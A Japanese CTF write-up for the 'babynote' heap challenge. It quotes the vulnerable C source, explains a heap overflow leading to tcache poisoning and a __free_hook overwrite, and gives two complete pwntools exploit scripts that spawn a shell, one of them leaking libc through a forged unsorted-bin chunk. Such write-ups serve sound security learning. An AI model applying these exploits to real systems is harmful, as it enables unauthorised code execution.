---
tags: pwn
---


# NITAC miniCTF 3rd - babynote (+α)

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## 公式リポジトリ

<https://github.com/nitaclt/nitac-minictf-3rd>

## はじめに

元の問題が正しい意味でBabyheapで流石に3週間もHeapやった人間がそのレベルで解いてドヤ顔するのどうなの?ということで縛りを加えてクリアしています

## Attachments

<https://github.com/nitaclt/nitac-minictf-3rd>

## Writeup

### Outline

元の問題では最初から`stdin`のアドレスが与えられているのでlibc leakは済んでいるところからの攻撃になる。今回はこのlibc leakが無かった時にシェルを取れるかという想定でも解いた。
[SECCON Beginners CTF 2019 - Babyheap](/yYXGki35TMemC0Jxi9xUHA)と状況が似ているがあちらはDouble Freeによるtcache poisoningだったのに大してこちらはHeap Overflowである(ということは両方やればHeap問題の脱入門が出来ます、やりましょう)。
もう言ってしまったがこの問題にはcreate時にHeap Overflowがある。それもoff-by-nullのような小さいものではなく改行するまで任意サイズを書き込める。
ということは確保したチャンクの真下にfreeされたチャンクがあればそこのfdを書き換えることで次の次にmallocで返るポインタが任意アドレスを指すように出来るので`__free_hook`を指すようにしてここにsystemでもone gadgetでもシェル起動アドレスを書き込む。

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Babyheapなのにフルアーマー
記憶に有る限りptr-yudaiさん製の問題はだいたいchecksecフルアーマーなのに初心者でもとっつきやすいので本当に凄い

### Binary

ソースコードが与えられているのでそれを引用する

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#define NOTE_NUM 8
#define SIZE_NOTE 0x90

char *noteList[NOTE_NUM];

__attribute__((constructor)) void setup(void) {
  int i;
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);
  alarm(60);
  for(i = 0; i < NOTE_NUM; i++) noteList[i] = NULL;
}

void readline(char *buf) {
  char *ptr;
  for(ptr = buf; ; ++ptr) {
    if (read(0, ptr, 1) <= 0) exit(0);
    if (*ptr == '\n') break;
  }
}

int read_int(void) {
  char buf[0x20];
  readline(buf);
  return atoi(buf);
}

int menu() {
  puts("1. Create");
  puts("2. Show");
  puts("3. Delete");
  printf("> ");
  return read_int();
}

int find_free_note(void) {
  int i;
  for(i = 0; i < NOTE_NUM; i++) {
    if (noteList[i] == NULL) return i;
  }
  return -1;
}

void new_note(void) {
  int idx = find_free_note();
  if (idx == -1) {
    puts("Notebook is full");
  } else {
    noteList[idx] = (char*)malloc(SIZE_NOTE);
    printf("Contents: ");
    readline(noteList[idx]);
    puts("Written!");
  }
}

void show_note(void) {
  int idx;
  printf("Index: ");
  idx = read_int();
  if (idx < 0 || idx >= NOTE_NUM) {
    puts("Invalid index");
  } else if (noteList[idx] == NULL) {
    puts("Note is empty");
  } else {
    printf("Contents: %s", noteList[idx]);
  }
}

void del_note(void) {
  int idx;
  printf("Index: ");
  idx = read_int();
  if (idx < 0 || idx >= NOTE_NUM) {
    puts("Invalid index");
  } else if (noteList[idx] == NULL) {
    puts("Note is empty");
  } else {
    puts("Deleted!");
    free(noteList[idx]);
    noteList[idx] = NULL;
  }
}

int main(void) {
  printf("HERE IS THE GIFT FOR YOU: %p\n", stdin);
  while(1) {
    switch(menu()) {
    case 1: new_note(); break;
    case 2: show_note(); break;
    case 3: del_note(); break;
    default: puts("Bye!"); return 0;
    }
  }
}

```

まず最初に`stdin`のアドレスをくれる。これでlibc leakが出来る
保持可能ポインタは8つでmallocサイズは0x90、つまりチャンクサイズにして0xa0
実行可能コマンドは次の3つ

1. create: `malloc(0x90)`で新しいノートを作りそこに書き込む、この時好きなだけ書き込めるのでHeap Overflowがある
2. show: インデックスを指定するとその中身を覗ける
3. delete: インデックスで指定されたポインタをfreeする。free後にポインタは破棄されるのでDouble FreeやUAFが難しくなる

### baby heap overflow

赤ちゃんなのでまずはくれた`stdin`の値を利用する方法で解く。赤ちゃんでもとりあえずここからlibc leakが出来ることは分かるのでlibcのアドレスとそこから計算できるあらゆるアドレスは知っている前提とする。
既にfreeされたチャンクが下にある状態でHeap Overflowでそのチャンクのfdを書き換えたいのでまずは次のようなチャンクの配置にする

```
A: これから確保する箇所、確保時にHeap OverflowでBのfdを書き換える
B: free済み、もちろんサイズ0xa0のtcacheに繋がっている
C: "/bin/sh", 最後の__free_hookでsystemが呼ばれた時に使う
```

これの実現にはまず3回createして(文字列は適当に`"/bin/sh"`でも書き込んでおけば良い)次にBにあたるインデックス(1)をdeleteする。これでサイズ0xa0のtcacheにはBだけが繋がっている状態になる。
次にAをfreeしたいのでインデックス2をdeleteする。これでサイズ0xa0のtcacheはA -> B -> nullというリストになり、望んだメモリ配置になった。

続いてAを確保するためにcreateをする。ここでBのfdをOverflowで書き換えるのでサイズ0xa0のtcacheはB -> x -> ???のようになる(xはOverflowで上書きされた値, 今回はもちろん`__free_hook`のアドレスを書き込む)
ここまでくればいつもの`__free_hook`の書き込み同様2回createして2回目の書き込み時にsystemのアドレスでもOne Gadgetでも好きな値を入れれば良い。今回はチャンクCに`"/bin/sh"`を仕込んでいるのでsystemのアドレスを入れてシェルを奪った。

### babyじゃない Heap Overflow

流石に3週間もHeap集中期間を設けているので無事に解けた。というわけで最初のlibc leak無しで自力でlibc leakし`__free_hook`を書き換える縛りで解いてみる。

Heap Overflow出来るサイズに限りは無いので真下のチャンクのサイズをUnsorted Binに入るぐらいデカい方向へ書き換えるついでにそのサイズに見合うチャンクを生成して真下のチャンクも整えて安全にUnsorted Binに送ることが出来るようにする。
後で利用するので他にも幾つかチャンクを確保してOverflow前に次のような状態にする

```
A: OverflowさせてBを0x501のチャンクとしてしまう
B: AからのOverflowでサイズが0x501に書き換えられる
C: BがUnsorted Binに放り込まれた後にOverlapする
D: C同様Overlapする(保険で取った)
(top): main_arena->topで指されているチャンク
```

Overflowさせるところまでの手順はだいたい元の問題と同じ、Overflowは下のC, Dのチャンクサイズを壊さないようにしながら0x500分のチャンクとなるように確保し、その下にPREV_INUSEが立った2つのチャンクも存在するようにしておく。だいたい次のような配置になる

```
A: Overflown
B: size: 0x501
C: Overlap
D: Overlap
(top): top
...
E: PREV_INUSE: 1
F: PREV_INUSE: 1
```

### libc leak

というわけでBをfreeする。サイズが0x500もあるのでUnsorted Binへ送られる。
今回初めて知ったのだが、Unsorted Binにチャンクを繋ぐ際にtopチャンクがUnsorted Binに入るチャンクとOverlapしていないかのチェックが存在する。
Heap Overflowでtopのサイズも書き換えることが出来るのだがここでtopのサイズを調整してEと全く重ならないようにした場合、topチャンクは完全にBに内包されることになる。
ここで、Unsorted Binに送る際に次のようなチェックが実装されている。

```c
if (__builtin_expect (contiguous (av)
          && (char *) nextchunk
          >= ((char *) av->top + chunksize(av->top)), 0))
```

このif文でtrueになると落ちる。条件を読むとtopチャンクの終端がUnsorted Binに入れようとしているチャンクの次のチャンクより前にあると落ちる。
つまりtopチャンクより下にチャンクが存在しているという状態はおかしいとみなしてabortする。
実際にabortするメモリ配置を示してみると次のようになる

```
---------B : 
|
| -----top : (char *) av->top
| |
| |
| -top end : 
|          : (char *) av->top + chunksize(av->top)
|
-----B end : 
           : (char *) nextchunk
```

この図ではtopチャンクが完全にBに内包されているが実際はtopの位置はどこでも良く、終端が次のチャンクより上に来ているというのが重要である。
というわけでA~Fまでを示した図においてEより前にtopチャンクの終端を置いてしまうようにtopのサイズを書き換えてしまうとUnsorted Binに送る際に怒られが発生してAbortする。
この制限を突破出来るならどんなサイズにしても良い、今回は何も考えずに0x6161616161616161にした。

ちょっとした裏話をすると一番最初に試しにlibc leakするためにBの中身を全部`b"a"`にしたのだがその時はlibc leakが出来、topのサイズをチャンクEとの境界に合うようにしたら落ちたので不思議だった。
それを思い出して`b"a"`で埋めたら(は?)通ったので結果としてこの仕様に気付くことが出来た。

さて、無事にBをUnsorted Binに送れたらこれまでのOverlap系の問題同様に切り出しを行い、ポインタが生きている箇所にUnsorted Binの先頭が来るようにする。今回はチャンクCに合わせた。
で、チャンクCをshowすればlibc leak出来る

### いつもの

というわけでチャンクのOverlapも済んでいるので同じ場所を指す2つのポインタをそれぞれfreeして`__free_hook`を書き換える。
libc leakで使ったshowの後にcreateするとCがインデックス2で得られているにも関わらず再度入手出来る(多分インデックス4ぐらい)。
この2つのインデックスで管理されているポインタをどちらもfreeすればあとはいつものtcache poisoningで書き換えが出来る。
もしくは元の問題同様にOverflowで書き換えてしまっても良い。せっかくクソデカチャンク切り出しをしたので今回はOverflowでは無く切り出しを利用しました(libcのバージョン上がるとDouble Free出来なくなるし今の内にしたいだけDouble Freeしたいというのもある(は?))

## Code

### 普通に解いた方

```python
from pwn import p64, u64, ELF, process


def select(s, sel, c=b"> "):
    s.recvuntil(c)
    s.sendline(sel)


def create(s, data=b"junk"):
    select(s, b"1")
    s.recvuntil(b"Contents: ")
    s.sendline(data)


def show(s, idx):
    select(s, b"2")
    s.recvuntil(b"Index: ")
    s.sendline(str(idx))
    s.recvuntil(b"Contents: ")
    return s.recvline().rstrip()


def delete(s, idx):
    select(s, b"3")
    s.recvuntil(b"Index: ")
    s.sendline(str(idx))
    

if __name__ == '__main__':
    """
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    """
    """
        - 固定サイズmalloc (0x90)
        - free時にポインタは消される
        - heap overflowあり
    """
    libc = ELF("./libc-2.27.so")

    s = process("./babynote")
    s.recvuntil(b"HERE IS THE GIFT FOR YOU: ")
    libc_addr = int(s.recvline()[2:-1], 16) - libc.symbols["_IO_2_1_stdin_"]
    print(hex(libc_addr))

    create(s, b"unchi")  # 0
    create(s, b"unchi")  # 1
    create(s, b"/bin/sh")  # 2
    delete(s, 1)
    delete(s, 0)
    create(s, b"a" * 0x98 + p64(0x100) + p64(libc_addr + libc.symbols["__free_hook"]))
    create(s)
    create(s, p64(libc_addr + libc.symbols["system"]))
    delete(s, 2)

    s.interactive()

```

### libcアドレス縛りで解いた方

```python
from pwn import p64, u64, ELF, process


def select(s, sel, c=b"> "):
    s.recvuntil(c)
    s.sendline(sel)


def create(s, data=b"junk"):
    select(s, b"1")
    s.recvuntil(b"Contents: ")
    s.sendline(data)


def show(s, idx):
    select(s, b"2")
    s.recvuntil(b"Index: ")
    s.sendline(str(idx))
    s.recvuntil(b"Contents: ")
    return s.recvline().rstrip()


def delete(s, idx):
    select(s, b"3")
    s.recvuntil(b"Index: ")
    s.sendline(str(idx))
    

if __name__ == '__main__':
    """
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    """
    """
        - 固定サイズmalloc (0x90)
        - free時にポインタは消される
        - heap overflowあり
    """
    libc = ELF("./libc-2.27.so")

    s = process("./babynote")
    s.recvuntil(b"HERE IS THE GIFT FOR YOU: ")
    libc_addr = int(s.recvline()[2:-1], 16) - libc.symbols["_IO_2_1_stdin_"]
    print(hex(libc_addr))

    create(s)  # 0
    create(s)  # 1
    create(s)  # 2
    create(s)  # 3

    delete(s, 0)
    _size = 0x500 - 0xa0 * 3
    payload = b"a" * 0x90 + p64(0xa0) + p64(0x501) + \
        b"/bin/sh\x00" + b"a" * 0x90 + p64(0xa1) + \
        b"/bin/sh\x00" + b"a" * 0x90 + p64(0xa1) + \
        b"/bin/sh\x00" + b"a" * 0x90 + \
        b"a" * (_size)
    double_fake = p64(0x21) + b"a" * 0x18 + p64(0x21)
    payload += double_fake
    create(s, payload)
    # _ = input()
    delete(s, 1)
    create(s)  # 1

    libc_leak = u64(show(s, 2)[:6].ljust(8, b"\x00")) - 0x3ebc40 - 0x60
    assert libc_addr == libc_leak

    create(s)  # 4
    delete(s, 4)
    delete(s, 2)
    create(s, p64(libc_leak + libc.symbols["__free_hook"]))  # 2
    create(s, b"/bin/sh\x00")  # 4
    create(s, p64(libc_leak + libc.symbols["system"]))  # 5

    delete(s, 4)

    s.interactive()

```

## Flag

ローカルでシェル取っただけ

## Special Thanks

Unsorted Binに送る際の検証に付き合ってくれた弊チームPwn担当のDronex君, glibc mallocを読んで出典として投げてくれたのも彼です

## 感想

showless leak系の問題を探していたら同じCTFでblind note(近い内にやります)という問題が出ており、その前にやれないかとこのCTFの別のHeapを探していたら遭遇しました。
流石に最初に与えられるlibcアドレスがあると3週間もHeapを(ほぼ)毎日触れた人間なら瞬殺出来るので(create, delete等の通信用関数を書いてある状態から12分だった)流石にそれだけだとこのコーナーの趣旨に反することから最初のlibc leak縛りでやりました、面白かったのでこんな感じのセルフ難易度上昇チャレンジは色々ネタを見つけてやってみたいです(libcのバージョン上げとか)。

Heap Overflowがかなり強力でした。固定サイズmallocでもサイズを問わないHeap Overflowがあるだけでまだそこそこ簡単に解けるというのが凄いです。